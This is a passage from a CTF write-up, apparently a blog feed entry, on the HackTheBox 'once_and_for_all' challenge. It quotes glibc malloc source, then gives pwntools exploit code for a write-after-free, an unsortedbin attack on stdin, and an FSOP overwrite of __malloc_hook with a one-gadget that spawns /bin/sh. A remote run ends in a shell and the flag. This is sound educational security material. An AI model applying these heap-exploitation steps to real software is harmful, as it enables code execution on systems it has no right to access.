<span class="nf">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="p">{</span>

<span class="c1">// It checks first fastbin then smallbin then unsorted bin
</span><span class="c1"></span>
<span class="k">for</span> <span class="p">(;;</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">int</span> <span class="n">iters</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">))</span>
        <span class="p">{</span>
          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
              <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span>
				   <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): memory corruption&#34;</span><span class="p">);</span>
          <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>

          <span class="cm">/*
</span><span class="cm">             If a small request, try to use last remainder if it is the
</span><span class="cm">             only chunk in unsorted bin.  This helps promote locality for
</span><span class="cm">             runs of consecutive small requests. This is the only
</span><span class="cm">             exception to best-fit, and applies only when there is
</span><span class="cm">             no exact fit for a small chunk.
</span><span class="cm">           */</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
              <span class="n">bck</span> <span class="o">==</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
              <span class="n">victim</span> <span class="o">==</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">last_remainder</span> <span class="o">&amp;&amp;</span>
              <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
            <span class="p">{</span>
              <span class="cm">/* split and reattach remainder */</span>
              <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
              <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
              <span class="n">av</span><span class="o">-&gt;</span><span class="n">last_remainder</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
              <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">remainder_size</span><span class="p">))</span>
                <span class="p">{</span>
                  <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
                  <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
                <span class="p">}</span>

              <span class="n">set_head</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
                        <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span> <span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
              <span class="n">set_head</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
              <span class="n">set_foot</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span><span class="p">);</span>

              <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
              <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
              <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
            <span class="p">}</span>

          <span class="cm">/* remove from unsorted list */</span>
          <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>

          <span class="cm">/* Take now instead of binning if exact fit */</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="n">nb</span><span class="p">)</span>
            <span class="p">{</span>
              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
		<span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="cp">#if USE_TCACHE
</span><span class="cp"></span>	      <span class="cm">/* Fill cache first, return to user only if cache fills.
</span><span class="cm">		 We may return one of these chunks later.  */</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">tcache_nb</span>
		  <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
		<span class="p">{</span>
		  <span class="n">tcache_put</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
		  <span class="n">return_cached</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		  <span class="k">continue</span><span class="p">;</span>
		<span class="p">}</span>
	      <span class="k">else</span>
		<span class="p">{</span>
<span class="cp">#endif
</span><span class="cp"></span>              <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
              <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
              <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
<span class="cp">#if USE_TCACHE
</span><span class="cp"></span>		<span class="p">}</span>
<span class="cp">#endif
</span><span class="cp"></span>            <span class="p">}</span>

	<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
</span><span class="s2">Before:
</span><span class="s2">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
</span><span class="s2">unsortedbin
</span><span class="s2">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">55</span><span class="p">)</span> <span class="c1"># pop it to access to chunk_1</span>

<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># restore valid fastbin chunk part of the 0x30 freelist</span>
<span class="c1"># put it back to the fastbin </span>

<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3ebca0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stdin</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
<span class="c1"># Write after free, &amp;stdin-&gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">After:
</span><span class="s2">0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
</span><span class="s2">unsortedbin
</span><span class="s2">all [corrupted]
</span><span class="s2">FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
</span><span class="s2">Before: same as above
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="c1"># == clean fastbin</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x40</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x30</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>

<span class="c1"># == clean fastbin</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">fastbins
</span><span class="s2">0x30: 0x0
</span><span class="s2">0x40: 0x0
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>Now we just have to ask for a <code>0x30</code> sized chunk:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1337&#34;</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;unsortedbin attack done on: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdin</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Enjoy your shell!&#34;</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">After:
</span><span class="s2">0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfca0 &lt;- stdin-&gt;_IO_buf_end
</span><span class="s2">0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0 &lt;- unsortedbin
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="fsop--profit">
        FSOP + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#fsop--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor FSOP &#43; PROFIT" href="#fsop--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The last part is very easy, we just have to overflow up to <code>&amp;__malloc_hook</code> to write the one-gadget:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> 
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">)</span> 
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> 
        <span class="sa">b</span><span class="s2">&#34;4</span><span class="se">\n\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3ed8d0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3ebae0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000ffffffff</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3e82a0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x150</span> <span class="o">+</span>  
        <span class="c1"># !!!!! </span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x10a38c</span><span class="p">)</span> <span class="c1"># &lt;- one-gadget</span>
        <span class="c1">#pwn.p64(libc + 0x4f322) </span>
        <span class="c1"># pwn.p64(0x1337) </span>
        <span class="p">)</span>
<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
</span><span class="s2">constraints:
</span><span class="s2">  [rsp+0x70] == NULL
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger <code>__malloc_hook</code> :).</p>
<p>Which gives:</p>
<pre tabindex="0"><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
[*] '/mnt/once_and_for_all'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/mnt/out'
[+] Opening connection to 167.172.56.180 on port 30332: Done
[*] Switching to interactive mode

How much space do you need for this massive weapon: Adding to your inventory..
$ id
uid=100(ctf) gid=101(ctf)
$ ls
flag.txt
glibc
once_and_for_all
$ cat flag.txt
HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
</code></pre><p>Find the tasks and the final exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/"
  
  >here</a
> and <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py"
  
  >here</a
>.</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/HackTheBox" term="HackTheBox" label="HackTheBox" />
                            
                        
                    
                
            
        </entry>
    
</feed>
